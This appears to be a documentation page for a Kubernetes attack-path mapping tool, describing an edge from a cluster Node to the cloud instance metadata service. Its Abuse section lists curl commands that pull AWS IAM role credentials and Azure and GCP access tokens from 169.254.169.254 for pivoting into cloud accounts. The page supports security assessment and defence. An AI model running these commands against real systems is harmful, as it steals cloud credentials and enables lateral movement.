# CH_accessIMDS

## Edge Schema

- **Source:** [CH_Node](../NodeDescriptions/CH_Node.md)
- **Target:** [CH_IMDSService](../NodeDescriptions/CH_IMDSService.md)

## General Information

The cloud provider's instance metadata endpoint is reachable from the Node, and therefore from workloads scheduled on it. The edge is drawn at the node level (one per Node) rather than from every Pod: per-pod reachability depends on NetworkPolicy and IMDSv2 hop-limit enforcement, which ClusterHound does not yet verify, so mapping it from each Pod individually was noise. Treat the edge as a potential path that warrants manual confirmation from a specific workload.

## Abuse

From a workload running on the Node (or from the Node itself after a breakout), query the metadata endpoint to retrieve IAM credentials, instance identity, and configuration data. Credentials obtained here can be used to pivot to cloud-level resources outside the cluster. Whether a given Pod can reach the endpoint depends on egress restrictions and, on AWS, whether IMDSv2 with a reduced hop limit is enforced.

```bash
# AWS - list available IAM roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS - retrieve credentials for a role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Azure - retrieve an access token for Azure Resource Manager
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP - retrieve a service account token
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

## References

- [AWS Instance Metadata Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [GCP Compute Metadata Server](https://cloud.google.com/compute/docs/metadata/overview)
- [HackTricks - Cloud Metadata Abuse](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html)
- [OWASP K08 - Cluster To Cloud Lateral Movement](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K08-Cluster-To-Cloud-Lateral-Movement.html)
- [Threat Matrix - Instance Metadata API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/)
